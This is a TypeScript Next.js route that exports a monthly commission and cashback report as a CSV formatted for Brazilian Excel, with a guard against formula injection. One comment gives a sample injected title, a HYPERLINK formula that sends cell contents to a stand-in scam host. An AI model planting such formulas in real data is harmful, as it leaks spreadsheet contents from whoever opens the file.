import { auth } from "@/auth";

const API_URL = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000";

type ReportRow = {
  date: string;
  client: string;
  clientPhone: string;
  clientEmail: string;
  clientCpf: string;
  listingTitle: string;
  assetType: string;
  bank: string;
  financedAmount: number;
  commissionRate: number;
  commissionAmount: number;
  commissionReceivedAt: string;
  cashbackPercent: number;
  cashbackAmount: number;
  netAmount: number;
  stage: "awaiting_commission" | "to_pay" | "paid";
  paidAt: string;
  paidNote: string;
};

// Planilha pro Excel em português: separador ";" (o Excel do Brasil usa a
// vírgula como decimal), número com vírgula decimal e BOM UTF-8 pra os
// acentos abrirem certo ao dar dois cliques no arquivo.
//
// "Formula injection": sem neutralizeFormula, alguém cria um anúncio com
// título tipo `=HYPERLINK("http://golpe"&A1)` e, quando o admin abre este
// CSV no Excel/Sheets, a fórmula roda. Prefixar com "'" neutraliza sem
// mudar o que aparece na célula (Excel esconde o apóstrofo inicial).
function neutralizeFormula(text: string): string {
  return /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
}

function cell(value: string | number): string {
  const text = typeof value === "number" ? value.toFixed(2).replace(".", ",") : neutralizeFormula(value);
  return /[";\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

function toCsv(header: string[], rows: (string | number)[][]): string {
  return "﻿" + [header, ...rows].map((row) => row.map(cell).join(";")).join("\r\n") + "\r\n";
}

function dateBr(iso: string): string {
  return iso ? new Date(iso).toLocaleDateString("pt-BR", { timeZone: "America/Sao_Paulo" }) : "";
}

const STAGE = { awaiting_commission: "Aguardando comissão do banco", to_pay: "Liberado — pagar", paid: "Pago" } as const;

// Fechamento mensal (ver RebatesService.monthlyReport).
// ?mes=AAAA-MM&tipo=detalhado|pagar — detalhado é um financiamento por linha;
// pagar lista só o cashback liberado (comissão recebida), com o CPF pro Pix.
export async function GET(request: Request) {
  const session = await auth();
  if (!session?.user || session.user.role !== "admin") return new Response("Acesso restrito.", { status: 403 });

  const url = new URL(request.url);
  const month = url.searchParams.get("mes") ?? "";
  const kind = url.searchParams.get("tipo") === "pagar" ? "pagar" : "detalhado";
  if (!/^\d{4}-\d{2}$/.test(month)) return new Response("Informe o mês no formato AAAA-MM.", { status: 400 });

  const upstream = await fetch(`${API_URL}/admin/financing-report?month=${month}`, {
    headers: { Authorization: `Bearer ${session.accessToken}` },
    cache: "no-store",
  });
  if (!upstream.ok) return new Response("Não foi possível gerar o relatório agora.", { status: upstream.status });
  const rows = (await upstream.json()) as ReportRow[];

  let csv: string;
  if (kind === "detalhado") {
    csv = toCsv(
      [
        "Data", "Cliente", "Telefone", "E-mail", "CPF (chave Pix)", "Tipo", "Anúncio", "Banco", "Valor financiado",
        "Comissão %", "Comissão (R$)", "Comissão recebida em", "Cashback %", "Cashback bruto (R$)",
        "Líquido NovoSeminovo (R$)", "Situação do cashback", "Pago em", "Observação do pagamento",
      ],
      rows.map((row) => [
        dateBr(row.date), row.client, row.clientPhone, row.clientEmail, row.clientCpf,
        row.assetType === "vehicle" ? "Veicular" : row.assetType === "property" ? "Imobiliário" : "",
        row.listingTitle, row.bank, row.financedAmount, row.commissionRate, row.commissionAmount,
        dateBr(row.commissionReceivedAt), row.cashbackPercent, row.cashbackAmount, row.netAmount, STAGE[row.stage],
        dateBr(row.paidAt), row.paidNote,
      ]),
    );
  } else {
    const toPay = rows.filter((row) => row.stage === "to_pay");
    csv = toCsv(
      ["Cliente", "CPF (chave Pix)", "E-mail", "Telefone", "Banco", "Valor financiado", "Cashback bruto (R$)"],
      [
        ...toPay.map((row) => [row.client, row.clientCpf, row.clientEmail, row.clientPhone, row.bank, row.financedAmount, row.cashbackAmount]),
        ["TOTAL", "", "", "", "", toPay.reduce((t, r) => t + r.financedAmount, 0), toPay.reduce((t, r) => t + r.cashbackAmount, 0)],
      ],
    );
  }

  return new Response(csv, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="comissoes-${kind}-${month}.csv"`,
      "Cache-Control": "no-store",
    },
  });
}
